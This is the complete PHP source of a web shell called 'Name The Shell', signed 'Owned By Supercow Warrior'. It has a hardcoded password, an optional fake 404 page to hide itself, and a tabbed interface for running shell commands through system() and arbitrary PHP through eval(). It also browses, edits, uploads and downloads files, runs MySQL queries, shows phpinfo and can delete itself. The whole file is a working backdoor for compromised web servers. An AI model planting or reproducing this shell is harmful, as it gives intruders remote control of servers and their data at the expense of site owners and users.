<?php
  
  
  /* Configurations */
  $username = "scarlats";
  $password = "scarlats";
  $auth_msg = "Name The Shell Login"; // Message that shows on authentication dialog
  $owned = "Owned By Supercow Warrior"; // Own String
  
  /* When it's true, the script will show not found if don't receive 
   * the parameter in $protected_param
   */
  $protected_notfound = false; 
  $protected_param = ""; /* If $protected_notfound is true then don't forget this */
  $protected_file = ""; /* If isn't empty then return the content of the file specified */
  $protected_type = ""; /* The Content-Type of $protected_file */
  
  
  /* Protect */
  if($_COOKIE['PROCT'] != $protected_param) { 
  if ($protected_notfound && !isset($_GET[$protected_param])) {
    header('HTTP/1.1 404 Not Found');
    echo "<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL ".$_SERVER['PHP_SELF']." was not found on this server.</p>
</body></html>";
    exit;
  }
  if (!empty($protected_param) && !isset($_GET[$protected_param])) {
    if(!empty($protected_file)) {
        header('Content-Type: '.$protected_type);
        if(file_exists($protected_file)) readfile($protected_file);
    }
    exit;
  }
  setcookie('PROCT', $protected_param);
  }
  
  $features = array(
    "filesystem" => "File Sytem",
    "encoder"    => "Encoder",
    "shellexec" => "Shell Exec",
    "phpexec" => "PHP Exec",
    "mysql" => "MySQL",
    "upload" => "Upload",
    "selfdestruct" => "Self Destruction",
    "\" onclick=\"if (confirm('Are you sure?')) window.close();\" \"" => "Quit"
   );
  
  /* Auth */
  
  if (isset($_SERVER['PHP_AUTH_USER']) && isset($_SERVER['PHP_AUTH_PW'])) {
    if ($_SERVER['PHP_AUTH_USER'] == $username && $_SERVER['PHP_AUTH_PW'] == $password) {
       $auth = true; // Just set it, for don't join so much code here
    }
    else {
       header("WWW-Authenticate: Basic realm=\"".$auth_msg."\"");
       
  
    }
  }
  else {
    header("WWW-Authenticate: Basic realm=\"".$auth_msg."\"");
    
  
  }
  
  if(!function_exists('mime_content_type')) {
    function mime_content_type($filename) {
        $ext = substr(strstr($filename, '.'), 1);
        $text = array('php', 'txt', 'css', 'htm', 'html', 'js', 'asp', 'aspx', 'jsp', 'cgi', 'sql');
        $image = array('jpg', 'jpeg', 'gif', 'png', 'jiff', 'svg', 'ico');
        $video = array('mpeg', 'avi', 'mp4', 'swf', 'wmv', 'rmvb', 'flv', '3gp');
        if(in_array($ext, $text)) {
           $mime = 'text/'.$ext;
        }
        elseif(in_array($ext, $image)) {
           $mime = 'image/'.$ext;
        }
        elseif(in_array($ext, $video)) {
           $mime = 'video/'.$ext;
        }
        else {
           $mime = 'application/'.$ext;
        }
        return $mime;
    }
  }
  if(!function_exists('posix_getpwuid')) {
     function getfuid($filen) {
       $out = shell_exec('ls -l "'.$filen.'"');
       $ar = split(' ', $out);
       return $ar[2];
     }
     function getfgid($filen) {
       $out = shell_exec('ls -l "'.$filen.'"');
       $ar = split(' ', $out);
       return $ar[3];
     }
  }     
  
  if(isset($_COOKIE['CWD']) && !isset($_GET['chdir'])) {
     chdir(base64_decode($_COOKIE['CWD']));
  }
  if(isset($_GET['chdir'])) {
     chdir((isset($_COOKIE['CWD']) && substr($_GET['chdir'], 0,1) != "/" ? base64_decode($_COOKIE['CWD'])."/" : "").$_GET['chdir']);
   
  }
  function str_perms($perms) {
    if (($perms & 0xC000) == 0xC000) {
        // Socket
        $info = 's';
    } 
    elseif (($perms & 0xA000) == 0xA000) {
        // Symbolic Link
        $info = 'l';
    } 
    elseif (($perms & 0x8000) == 0x8000) {
        // Regular
        $info = '-';
    } 
    elseif (($perms & 0x6000) == 0x6000) {
        // Block special
        $info = 'b';
    } 
    elseif (($perms & 0x4000) == 0x4000) {
        // Directory
        $info = 'd';
    } 
    elseif (($perms & 0x2000) == 0x2000) {
        // Character special
        $info = 'c';
    } 
    elseif (($perms & 0x1000) == 0x1000) {
        // FIFO pipe
        $info = 'p';
    } 
    else {
        // Unknown
        $info = 'u';
    }
    
    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ?
             (($perms & 0x0800) ? 's' : 'x' ) :
             (($perms & 0x0800) ? 'S' : '-'));

    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ?
             (($perms & 0x0400) ? 's' : 'x' ) :
             (($perms & 0x0400) ? 'S' : '-'));

    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ?
             (($perms & 0x0200) ? 't' : 'x' ) :
             (($perms & 0x0200) ? 'T' : '-'));
             
    /* Code copied from: http://www.php.net/manual/en/function.fileperms.php */
    return $info;
  }
  
  function readable_size($size) {
     $kb = 1024;
     $mb = 1024*$kb;
     $gb = 1024*$mb;
     $tb = 1024*$gb;
     
     if ($size < $kb) {
         return sprintf("%d B", $size);
     }
     elseif ($size >= $kb and $size < $mb) {
         return sprintf("%.2f KB", $size/$kb);
     }
     elseif ($size >= $mb and $size < $gb) {
         return sprintf("%.2f MB", $size/$mb); 
     }
     elseif ($size >= $gb and $size < $tb) {
         return sprintf("%.2f GB", $size/$gb); 
     }
     else {
         return sprintf("%.2f TB", $size/$tb); 
     }
     
  }
  
  if (!isset($_GET['content'])) {
     echo "<html>
     <head>
     <title>".$_SERVER['HTTP_HOST']." - Name The Shell</title>
     <style type=\"text/css\">
     
     body {
     font-size: 10pt;
     font-family: Ubuntu;
     color: #ccc;
     background-color: #111;
     line-height: 14pt;
     margin-top: 20pt;
     }
     
     #header {
     padding: 5pt;
     }
     
     #file_tbl {
     width: 100%;
     font-size: 10pt;
     }
     #file_tbl th {
     font-weight: bold;
     text-align: left;
     }
     .frm {
     border: 1pt solid #ccc;
     border-radius: 5pt;
     background-color: #52f;
     padding: 5pt;
     margin-bottom: 5pt;
     font-size: 10pt;
     }
     .button {
     color: #aaa;
     text-decoration: none;
     margin: 8pt;
     border-radius: 3pt;
     font-weight: bold;
     padding: 3pt;
     border: 1pt solid #52f;
     }
     .button:hover {
     color: #fff;
     border: 1pt solid #ddd;
     }
     #selected {
     border: 1pt solid #ddd;
     background-color: #30a;
     }
     .file {
     color: #ccc;
     text-decoration: none;
     }
     .file:hover {
     color: #fff;
     }
     
     a {
     color: #4cf;
     text-decoration: none;
     }
     a:hover {
     color : #fff;
     }
     #code {
     background-color: #fff;
     border-radius: 5pt;
     padding: 15pt;
     }
     #resultquery, #resultquery th, #resultquery td {
     border: 1pt solid;
     
     }
     .fstoolbar:hover {
     opacity: 0.8;
     }
     </style>
     <script language=\"javascript\">
     function mkdir() {
     var dirname = prompt('Directory name:');
     document.location.href = '?mkdir='+dirname;
     }
     function touch() {
     var filename = prompt('File name:');
     document.location.href = '?feature=info&act=touch&filename='+filename;
     }
     </script>
     </head>
     <body>", PHP_EOL; 
     
     $uname = shell_exec("uname -a");
     $software = $_SERVER['SERVER_SOFTWARE'];
     $uid = shell_exec("id");
     $pwd = getcwd();
     
     echo "<h1 align=\"center\">Name The Shell</h1>", PHP_EOL;
     echo "<div id=\"header\" class=\"frm\">"."<br/>\n";
     echo "Software: ".$software." "."<a href=\"?content=phpinfo\" target=\"_blank\">PHP ".phpversion()."</a><br/>\n";
     echo "uname -a: ".$uname."<br/>\n";
     echo $uid."<br/>\n";
     echo ini_get('safe_mode') ? "<span style=\"color: red; font-weight: bold;\">Safe mode ON</span><br>\n" : "<span style=\"color: #0cf; font-weight: bold\">Safe mode OFF</span><br>\n";
     echo $pwd." <b>".str_perms(fileperms($pwd))."</b><br/>\n";
     echo "</div>\n";
     setcookie('CWD', base64_encode($pwd));
     
     if (isset($_GET['mkdir'])) {
        if (mkdir($_GET['mkdir'])) {
           echo 
           "<script language=\"javascript\"> alert('Directory ".$_GET['mkdir']." created!'); </script>\n";
        }
        else {
              echo 
           "<script language=\"javascript\"> alert('Fail to create ".$_GET['mkdir']."'); </script>\n";
        }
     }
     
     $cwd = opendir($pwd);
     $files = array();
     $dirs = array();
     for($i = 0; ($f = readdir($cwd)); $i++) {
        if (filetype($f) == 'dir') 
            $dirs[$i] = $f;
        else
            $files[$i] = $f;
     }
     sort($dirs);
     sort($files);
     $files = array_merge($dirs, $files);
     
     echo "<div class=\"frm\" align=\"center\">".$owned."</div>\n";
     
     /* Menu of features */
     echo "<div class=\"frm\" style=\"padding: 10pt;\">\n";
     foreach($features as $i => $title) {
        echo "<a href=\"?feature=".$i."\" class=\"button\" ";
        if (isset($_GET['feature']) && $_GET['feature'] == $i) echo "id=\"selected\"";
        if (!isset($_GET['feature']) and $i == "filesystem") echo  "id=\"selected\"";
        echo " >".$title."</a>\n";
     }
     echo "</div>\n";
     
     
     if (!isset($_GET['feature']) or $_GET['feature'] == 'filesystem') {
     /* List the files of current directory */
     echo "<div class=\"frm\">\n";
     echo "<table border=0 id=\"file_tbl\" >\n";
     echo "<tr><th>Filename</th><th>Size</th><th>Modify</th><th>Owner/Group</th><th>Perms</th><th>Action</th></tr>\n";
     foreach($files as $f) {
          $perms = str_perms(fileperms($f));
          $info = stat($f);
          if (function_exists('posix_getpwuid')) {
          $u= posix_getpwuid($info['uid']);
          $user_owner = $u['name'];
          }
          else $user_owner = getfuid($f);
          if (function_exists('posix_getgrgid')) {
          $g = posix_getgrgid($info['gid']);
          $group_owner = $g['name'];
          }
          else $groud_owner = getfgid($f);
          $size = $info['size'];
          $modify = $info['mtime'];
          
          echo "<tr>\n";
          echo "<td>";
          echo ((fileperms($f) & 0x4000) ? "<img src=\"?content=img&id=dir\" width=20 height=20 style=\"vertical-align: middle\"/>":"");
          
          if (!(fileperms($f) & 0x4000)) {
             $mime = mime_content_type($f);
             $type_a = $mime ? split("/", $mime): "binary";
             $type = $type_a[0];
             $type = $type == 'application' || $type == 'inode' ? 'binary' : $type;
             echo "<img src=\"?content=img&id=".$type."\" width=20 height=20 style=\"vertical-align: middle\"/>";
          }
          
          echo ((fileperms($f) & 0x4000) ? "<a href=\"?chdir=$f\" class=file>".$f."</a>" : "<a class=file href=\"?feature=info&filename=".$f."\">".$f."</a>");
          echo "</td>\n";
          echo "<td>". ((fileperms($f) & 0x4000) ? "DIR":readable_size(intval($size))) ."</td>\n";
          echo "<td>".date('d-m-Y H:i:s', intval($modify))."</td>\n";
          echo "<td>".$user_owner."/".$group_owner."</td>\n";
          echo "<td>".$perms."</td>\n";
          echo "<td>";
          echo ((fileperms($f) & 0x4000) ? "":"<a href=\"?feature=info&act=edit&filename=".$f."\"><img src=\"?content=img&id=edit\"".
               " width=20 height=20 style=\"vertical-align: middle\"/></a>");
          echo ((fileperms($f) & 0x4000) ? "":"<a href=\"?content=download&filename=".$f."\">".
               "<img src=\"?content=img&id=down\" widht=20 height=20 style=\"vertical-align: middle;\"/></a>");
          echo "</td>\n";
          echo "</tr>\n";
     }
          echo "</table>\n";
          echo "<hr noshade>\n";
          echo "<a class=\"fstoolbar\" href=\"?chdir=".$_SERVER['DOCUMENT_ROOT']."\"><img src=\"?content=img&id=home\"></a>\n";
          echo "<input type=\"image\" class=\"fstoolbar\" src=\"?content=img&id=dirnew\" onclick=\"mkdir();\"/>\n";
          echo "<a class=\"fstoolbar\" href=\"?chdir=".urlencode('/')."\"><img src=\"?content=img&id=fileroot\"></a>\n";
          echo "<input type=\"image\" class=\"fstoolbar\" src=\"?content=img&id=filenew\" onclick=\"touch();\"/>\n";
          echo "<a class=\"fstoolbar\" href=\"?\"><img src=\"?content=img&id=refresh\"/></a>\n";
          echo "</div>";
     }
     
     if (isset($_GET['feature']) && $_GET['feature'] == 'encoder') {
        echo "<div class=\"frm\">";
        echo "<form action=\"?feature=encoder\" method=\"post\">\n";
        echo "<textarea name=\"input\" style=\"width: 100%; height: 80pt;\">".$_POST['input']."</textarea><br>\n";
        echo "<input type=\"submit\" value=\"Calculate\"/>\n";
        echo "</form>\n";
        
        echo "<table border=0>\n";
        echo "<tr><td colspan=2>\n"; 
        
        echo "<b>Hashes:</b></td></tr>";
        echo "<tr><td align=right>\n";
        echo "md5: </td><td><input type=\"text\" value=\"".md5($_POST['input'])."\"/>\n</td></tr>";
        echo "<tr><td align=right>\n";
        echo "sha1: </td><td><input type=\"text\" value=\"".sha1($_POST['input'])."\"/>\n</td></tr>";
        echo "<tr><td align=right>\n";
        echo "crc32: </td><td><input type=\"text\" value=\"".crc32($_POST['input'])."\"/>\n</td></tr>";
        
        echo "<tr><td colspan=2>\n";
        echo "<b>Url:</b></td></tr>\n";
        echo "<tr><td align=right>\n";
        echo "urlencode: </td><td><input type=\"text\" value=\"".urlencode($_POST['input'])."\"/></td></tr>\n";
        echo "<tr><td align=right>\n";
        echo "urldecode: </td><td><input type=\"text\" value=\"".urldecode($_POST['input'])."\"/></td></tr>\n";
        
        echo "<tr><td colspan=2>\n";
        echo "<b>Base64:</b></td></tr>\n";
        echo "<tr><td align=right>\n";
        echo "base64_encode: </td><td><input type=\"text\" value=\"".base64_encode($_POST['input'])."\"/></td></tr>\n";
        echo "<tr><td align=right>\n";
        echo "base64_decode: </td><td><input type=\"text\" value=\"".base64_decode($_POST['input'])."\"/></td></tr>\n";
        
        echo "</table>\n";
        echo "</div>";
     }
     
     if (isset($_GET['feature']) && $_GET['feature'] == 'info') {
        echo "<div class=\"frm\">\n";
        
        echo "<b>Viewing file: </b>".$_GET['filename']."&nbsp;(".readable_size(filesize($_GET['filename'])).")&nbsp;&nbsp<b>".str_perms(fileperms($_GET['filename']))."</b><br/>\n";
        
        $toolbar = array(
                "Info" => "?feature=info",
                "Code" => "?feature=info&act=code",
                "Edit" => "?feature=info&act=edit",
                "Image" => "?feature=info&act=img"
                );
                
        foreach($toolbar as $title => $url) {
           echo "<a href=\"".$url."&filename=".$_GET['filename']."\" style=\"font-weight:bold; margin-left: 5pt;\">".$title."</a>\n";
        }
        
        echo "<hr noshade/>";
        
        if (!isset($_GET['act'])) {
            $f = $_GET['filename'];
            $perms = str_perms(fileperms($f));
            $info = stat($f);
            if(function_exists('posix_getpwuid')) {
            $u = posix_getpwuid($info['uid']);
            $user_owner = $u['name'];
            }
            else $user_owner = getfuid($f);
            if(function_exists('posix_getgrgid')) {
            $g = posix_getgrgid($info['gid']);
            $group_owner = $g['name'];
            }
            else $group_owner = getfgid($f);
            $size = $info['size'];
            $modify = $info['mtime'];
            $atime = $info['atime'];
            $ctime = $info['ctime'];
        
            echo "<table border=0 id=\"file_tbl\">\n";
            echo "<tr><td><b>Path: </b></td><td>".$pwd."/".$f."</td></tr>\n";
            echo ((fileperms($f) & 0x4000) ? "":"<tr><td><b>Size: </b></td><td>".readable_size(intval($size))."</td></tr>\n");
            echo ((fileperms($f) & 0x4000) ? "":"<tr><td><b>MD5: </b></td><td>".md5(file_get_contents($f))."</td></tr>\n");
            echo "<tr><td><b>Owner/Group:</b></td><td>".$user_owner."/".$group_owner."</td></tr>\n";
            echo "<tr><td><b>Perms:</b></td><td>".$perms."</td></tr>\n";
            echo "<tr><td><b>Access Time:</b></td><td>".date('d-m-Y H:i:s', intval($atime))."</td></tr>\n";
            echo "<tr><td><b>Create Time:</b></td><td>".date('d-m-Y H:i:s', intval($ctime))."</td></tr>\n";
            echo "<tr><td><b>Modify Time:</b></td><td>".date('d-m-Y H:i:s', intval($modify))."</td></tr>\n";
            echo "</table>";            
        }
        
        if (isset($_GET['act']) && $_GET['act'] == 'code') {
            echo "<div id=\"code\">\n";
            highlight_file($_GET['filename']);
            echo "</div>\n";
        
        }
        if (isset($_GET['act']) && $_GET['act'] == 'edit') {
            if (isset($_POST['filecontent'])) {
               $fp = fopen($_GET['filename'], 'w');
               fwrite($fp, $_POST['filecontent']);
               fclose($fp);
            }
        
            echo "<form action=\"?feature=info&act=edit&filename=".$_GET['filename']."\" method=\"post\">\n";
            echo "<textarea name=\"filecontent\" style=\"width: 100%; height: 100%;\">".file_get_contents($_GET['filename'])."</textarea><br>\n";
            echo "<input type=\"submit\" value=\"Save\"/>\n";
            echo "<input type=\"reset\" value=\"Reset\"/>\n";
            echo "</form>\n";
            
        }
        if (isset($_GET['act']) && $_GET['act'] == 'img') {
            echo "<img src=\"?content=download&filename=".$pwd."/".$_GET['filename']."\">";
        }
        if (isset($_GET['act']) && $_GET['act'] == 'touch') {
            $code = touch($_GET['filename']) ? "document.location.href='".$toolbar['Edit']."&filename=".$_GET['filename']."';" : "alert('Fail to create file.');\n history.back();";
            echo "<script language=\"javascript\"> ".$code." </script>";
         }   
        echo "</div>\n";
     }
     if (isset($_GET['feature']) && $_GET['feature'] == 'shellexec') {
        echo "<div class=\"frm\">";
        echo "<b>Code:</b><br>\n";
        echo "<form action=\"?feature=shellexec\" method=post>\n";
        echo "<textarea name=cmd style=\"width: 100%; height: 50pt;\">";
        echo isset($_POST['cmd']) ? $_POST['cmd'] : "";
        echo "</textarea><br>\n";
        echo "<input type=\"submit\" value=\"Run\">\n";
        echo "</form>";
        echo "<b>Output:</b><br>\n";
        echo "<textarea style=\"width: 100%; height: 150pt;\">";
        $return = 0;
        if (isset($_POST['cmd']))  system($_POST['cmd'], $return);
        echo "</textarea>\n";
        echo "<b>Status: ".$return."</b>\n";
        echo "</div>\n";
     }
     if (isset($_GET['feature']) && $_GET['feature'] == 'phpexec') {
        echo "<div class=\"frm\">\n";
        echo "<b>Code:</b><br>\n";
        echo "<form action=\"?feature=phpexec\" method=post>\n";
        echo "<textarea name=cmd style=\"width: 100%; height: 50pt;\">";
        echo isset($_POST['cmd']) ? $_POST['cmd'] : "";
        echo "</textarea><br>\n";
        echo "<input type=\"submit\" value=\"Run\">\n";
        echo "</form>";
        ini_set('display_errors', 'On');
        echo "<b>Output:</b><br>\n";
        echo "<textarea style=\"width: 100%; height: 150pt;\">";
        if (isset($_POST['cmd']))  echo eval($_POST['cmd']);
        echo "</textarea>\n";
        echo "</div>\n";
     }
     if (isset($_GET['feature']) && $_GET['feature'] == 'upload') {
        echo "<div class=\"frm\">\n";
        echo "<form action=\"?feature=upload\" enctype=\"multipart/form-data\" method=\"post\">\n";
        echo "<b>Save in: <input type=\"text\" name=\"uploadir\" value=\"".$pwd."\"/>\n";
        echo "<input type=\"file\" name=\"thefile\"/>\n";
        echo "<input type=\"submit\" value=\"Upload\"/>\n";
        echo "</form>\n";
        
        if (isset($_FILES['thefile'])) {
            $path = $_POST['uploadir'];
            $path = $path.(substr($path, -1) == '/' ? "": "/").$_FILES['thefile']['name'];
            $msg = move_uploaded_file($_FILES['thefile']['tmp_name'], $path) ? "File Uploaded!" : "Fail to upload the file.";
            echo "<script language=\"javascript\"> alert('".$msg."'); </script>\n";
        }
       
     } 
     if (isset($_GET['feature']) && $_GET['feature'] == 'selfdestruct') {
            echo "<div class=\"frm\">\n";
            echo "<form action=\"?feature=selfdestruct\">";
            echo "<b>ARE YOU SURE?</b><br>";
            echo "Type 369 to confirm: <input type=\"text\" name=\"c\"/><input type=\"submit\" value=\"Ok\"/>";
            echo "</form>";
            echo "</div>";
            
            if($_GET['c'] == '369') {
                unlink($_SERVER['SCRIPT_FILENAME']);
            }
       }
      if (isset($_GET['feature']) && $_GET['feature'] == 'mysql') {
         if(isset($_COOKIE['DBM']) && base64_decode($_COOKIE['DBM']) != "::::" && $_COOKIE['DBM']) {
            list($musername, $mpassword, $hostname, $port, $db) = split(':', base64_decode($_COOKIE['DBM']));
            $conn = true;
         }
         else $conn = false;
         
         $form = array(
           "musername" => "Username",
           "mpassword" => "Password",
           "hostname" => "Hostname",
           "port"     => "Port",
           "db"       => "Database"
         );
         
         echo "<div class=\"frm\">\n";
         echo "<form action=\"?feature=mysql\">";
         echo "<table border=0>\n";
         foreach($form as $field => $label) {
            echo "<tr><td align=right><b>".$label."</td><td><input type=\"text\" name=\"".$field."\" value=\"".$$field."\"/>\n";
         }
         echo "<input type=\"hidden\" name=\"feature\" value=\"mysql\">";
         echo "<tr><td align=right><input type=\"submit\" value=\"Connect\"/>";
         echo "</table></form>";
         
         if(isset($_GET['musername']) && isset($_GET['mpassword']) && isset($_GET['hostname']) && isset($_GET['port']) && isset($_GET['db']) )
         setcookie('DBM', base64_encode($_GET['musername'].':'.$_GET['mpassword'].':'.$_GET['hostname'].':'.$_GET['port'].':'.$_GET['db']));
         
         if ($conn) {
           $connection = mysql_connect($hostname.':'.$port, $musername, $mpassword);
           if ($connection) {
              mysql_select_db($db, $connection);
              
              echo "<form action=\"?feature=mysql\" method=post>\n";
              echo "<b>SQL Query:</b><br>";
              echo "<textarea name=\"query\" style=\"width: 100%\">".$_POST['query']."</textarea><br>";
              echo "<input type=\"submit\" value=\"Submit Query\"/>\n";
              echo "</form>";
              
              if(isset($_POST['query'])) {
                $r = mysql_query($_POST['query'], $connection);
                $result = mysql_fetch_assoc($r);
                
                echo "<table border=1 cellspacing=0 id=\"resultquery\" cellpadding=5>";
                echo "<tr>";
                foreach($result as $column => $value) {
                    echo "<th>".$column."</th>";
                }
                echo "</tr>";
                
                echo "<tr>";
                foreach($result as $key => $value) {
                    echo "<td>".$value."</td>";
                }
                
                while($result = mysql_fetch_assoc($r)) {
                  echo "<tr>";
                  foreach($result as $key => $value) {
                    echo "<td>".$value."</td>";
                  }
                  echo "</tr>";
                }
                
                echo "</table>";
                }
                mysql_close($connection);
           }
           else
             echo "<b>Fail on connection.</b>";
         }
      }
     echo "</body>\n";
     echo "</html>\n";
    }    
    
    if(isset($_GET['content']) && $_GET['content'] == 'phpinfo') {
        phpinfo();
    }
    
    if(isset($_GET['content']) && $_GET['content'] == 'download') {
      $file = $_GET['filename'];
      header('Content-Type: application/octet-stream');
      header('Content-Disposition: attachment; filename='.$file);
      header('Content-Lenght: '.filesize($file));
      readfile($file);
    }
    
    if(isset($_GET['content']) && $_GET['content'] == 'img') {
        if(isset($_GET['id'])) {
          header('Content-Type: image/png; charset=utf-8');
          $image = array(
            "edit" =>
            "iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAACXBIWXMAAAsTAAALEwEAmpwYAAAK".
            "T2lDQ1BQaG90b3Nob3AgSUNDIHByb2ZpbGUAAHjanVNnVFPpFj333vRCS4iAlEtvUhUIIFJCi4AU".
            "kSYqIQkQSoghodkVUcERRUUEG8igiAOOjoCMFVEsDIoK2AfkIaKOg6OIisr74Xuja9a89+bN/rXX".
            "Pues852zzwfACAyWSDNRNYAMqUIeEeCDx8TG4eQuQIEKJHAAEAizZCFz/SMBAPh+PDwrIsAHvgAB".
            "eNMLCADATZvAMByH/w/qQplcAYCEAcB0kThLCIAUAEB6jkKmAEBGAYCdmCZTAKAEAGDLY2LjAFAt".
            "AGAnf+bTAICd+Jl7AQBblCEVAaCRACATZYhEAGg7AKzPVopFAFgwABRmS8Q5ANgtADBJV2ZIALC3".
            "AMDOEAuyAAgMADBRiIUpAAR7AGDIIyN4AISZABRG8lc88SuuEOcqAAB4mbI8uSQ5RYFbCC1xB1dX".
            "Lh4ozkkXKxQ2YQJhmkAuwnmZGTKBNA/g88wAAKCRFRHgg/P9eM4Ors7ONo62Dl8t6r8G/yJiYuP+".
            "5c+rcEAAAOF0ftH+LC+zGoA7BoBt/qIl7gRoXgugdfeLZrIPQLUAoOnaV/Nw+H48PEWhkLnZ2eXk".
            "5NhKxEJbYcpXff5nwl/AV/1s+X48/Pf14L7iJIEyXYFHBPjgwsz0TKUcz5IJhGLc5o9H/LcL//wd".
            "0yLESWK5WCoU41EScY5EmozzMqUiiUKSKcUl0v9k4t8s+wM+3zUAsGo+AXuRLahdYwP2SycQWHTA".
            "4vcAAPK7b8HUKAgDgGiD4c93/+8//UegJQCAZkmScQAAXkQkLlTKsz/HCAAARKCBKrBBG/TBGCzA".
            "BhzBBdzBC/xgNoRCJMTCQhBCCmSAHHJgKayCQiiGzbAdKmAv1EAdNMBRaIaTcA4uwlW4Dj1wD/ph".
            "CJ7BKLyBCQRByAgTYSHaiAFiilgjjggXmYX4IcFIBBKLJCDJiBRRIkuRNUgxUopUIFVIHfI9cgI5".
            "h1xGupE7yAAygvyGvEcxlIGyUT3UDLVDuag3GoRGogvQZHQxmo8WoJvQcrQaPYw2oefQq2gP2o8+".
            "Q8cwwOgYBzPEbDAuxsNCsTgsCZNjy7EirAyrxhqwVqwDu4n1Y8+xdwQSgUXACTYEd0IgYR5BSFhM".
            "WE7YSKggHCQ0EdoJNwkDhFHCJyKTqEu0JroR+cQYYjIxh1hILCPWEo8TLxB7iEPENyQSiUMyJ7mQ".
            "AkmxpFTSEtJG0m5SI+ksqZs0SBojk8naZGuyBzmULCAryIXkneTD5DPkG+Qh8lsKnWJAcaT4U+Io".
            "UspqShnlEOU05QZlmDJBVaOaUt2ooVQRNY9aQq2htlKvUYeoEzR1mjnNgxZJS6WtopXTGmgXaPdp".
            "r+h0uhHdlR5Ol9BX0svpR+iX6AP0dwwNhhWDx4hnKBmbGAcYZxl3GK+YTKYZ04sZx1QwNzHrmOeZ".
            "D5lvVVgqtip8FZHKCpVKlSaVGyovVKmqpqreqgtV81XLVI+pXlN9rkZVM1PjqQnUlqtVqp1Q61Mb".
            "U2epO6iHqmeob1Q/pH5Z/YkGWcNMw09DpFGgsV/jvMYgC2MZs3gsIWsNq4Z1gTXEJrHN2Xx2KruY".
            "/R27iz2qqaE5QzNKM1ezUvOUZj8H45hx+Jx0TgnnKKeX836K3hTvKeIpG6Y0TLkxZVxrqpaXllir".
            "SKtRq0frvTau7aedpr1Fu1n7gQ5Bx0onXCdHZ4/OBZ3nU9lT3acKpxZNPTr1ri6qa6UbobtEd79u".
            "p+6Ynr5egJ5Mb6feeb3n+hx9L/1U/W36p/VHDFgGswwkBtsMzhg8xTVxbzwdL8fb8VFDXcNAQ6Vh".
            "lWGX4YSRudE8o9VGjUYPjGnGXOMk423GbcajJgYmISZLTepN7ppSTbmmKaY7TDtMx83MzaLN1pk1".
            "mz0x1zLnm+eb15vft2BaeFostqi2uGVJsuRaplnutrxuhVo5WaVYVVpds0atna0l1rutu6cRp7lO".
            "k06rntZnw7Dxtsm2qbcZsOXYBtuutm22fWFnYhdnt8Wuw+6TvZN9un2N/T0HDYfZDqsdWh1+c7Ry".
            "FDpWOt6azpzuP33F9JbpL2dYzxDP2DPjthPLKcRpnVOb00dnF2e5c4PziIuJS4LLLpc+Lpsbxt3I".
            "veRKdPVxXeF60vWdm7Obwu2o26/uNu5p7ofcn8w0nymeWTNz0MPIQ+BR5dE/C5+VMGvfrH5PQ0+B".
            "Z7XnIy9jL5FXrdewt6V3qvdh7xc+9j5yn+M+4zw33jLeWV/MN8C3yLfLT8Nvnl+F30N/I/9k/3r/".
            "0QCngCUBZwOJgUGBWwL7+Hp8Ib+OPzrbZfay2e1BjKC5QRVBj4KtguXBrSFoyOyQrSH355jOkc5p".
            "DoVQfujW0Adh5mGLw34MJ4WHhVeGP45wiFga0TGXNXfR3ENz30T6RJZE3ptnMU85ry1KNSo+qi5q".
            "PNo3ujS6P8YuZlnM1VidWElsSxw5LiquNm5svt/87fOH4p3iC+N7F5gvyF1weaHOwvSFpxapLhIs".
            "OpZATIhOOJTwQRAqqBaMJfITdyWOCnnCHcJnIi/RNtGI2ENcKh5O8kgqTXqS7JG8NXkkxTOlLOW5".
            "hCepkLxMDUzdmzqeFpp2IG0yPTq9MYOSkZBxQqohTZO2Z+pn5mZ2y6xlhbL+xW6Lty8elQfJa7OQ".
            "rAVZLQq2QqboVFoo1yoHsmdlV2a/zYnKOZarnivN7cyzytuQN5zvn//tEsIS4ZK2pYZLVy0dWOa9".
            "rGo5sjxxedsK4xUFK4ZWBqw8uIq2Km3VT6vtV5eufr0mek1rgV7ByoLBtQFr6wtVCuWFfevc1+1d".
            "T1gvWd+1YfqGnRs+FYmKrhTbF5cVf9go3HjlG4dvyr+Z3JS0qavEuWTPZtJm6ebeLZ5bDpaql+aX".
            "Dm4N2dq0Dd9WtO319kXbL5fNKNu7g7ZDuaO/PLi8ZafJzs07P1SkVPRU+lQ27tLdtWHX+G7R7ht7".
            "vPY07NXbW7z3/T7JvttVAVVN1WbVZftJ+7P3P66Jqun4lvttXa1ObXHtxwPSA/0HIw6217nU1R3S".
            "PVRSj9Yr60cOxx++/p3vdy0NNg1VjZzG4iNwRHnk6fcJ3/ceDTradox7rOEH0x92HWcdL2pCmvKa".
            "RptTmvtbYlu6T8w+0dbq3nr8R9sfD5w0PFl5SvNUyWna6YLTk2fyz4ydlZ19fi753GDborZ752PO".
            "32oPb++6EHTh0kX/i+c7vDvOXPK4dPKy2+UTV7hXmq86X23qdOo8/pPTT8e7nLuarrlca7nuer21".
            "e2b36RueN87d9L158Rb/1tWeOT3dvfN6b/fF9/XfFt1+cif9zsu72Xcn7q28T7xf9EDtQdlD3YfV".
            "P1v+3Njv3H9qwHeg89HcR/cGhYPP/pH1jw9DBY+Zj8uGDYbrnjg+OTniP3L96fynQ89kzyaeF/6i".
            "/suuFxYvfvjV69fO0ZjRoZfyl5O/bXyl/erA6xmv28bCxh6+yXgzMV70VvvtwXfcdx3vo98PT+R8".
            "IH8o/2j5sfVT0Kf7kxmTk/8EA5jz/GMzLdsAAAAgY0hSTQAAeiUAAICDAAD5/wAAgOkAAHUwAADq".
            "YAAAOpgAABdvkl/FRgAAB6NJREFUeNrsl1+MXFUdxz/nnnPv3Jl7Z+7M7HRn/5UUa0tLQSAqWFMF".
            "JYoQID7Ig0GNj5qICYSQqCEx6gPR+OCDRg0xMZomxPhgaIVCUAwCFlxIZEu3htK17XZ3Z3fn787O".
            "nbn33OPDzM7Olkp8MX3xl0xy7vzuPb/v+f35/n5HGGO4mmJxleX/AK46ALW1eOLHTwBgdEw2m8V1".
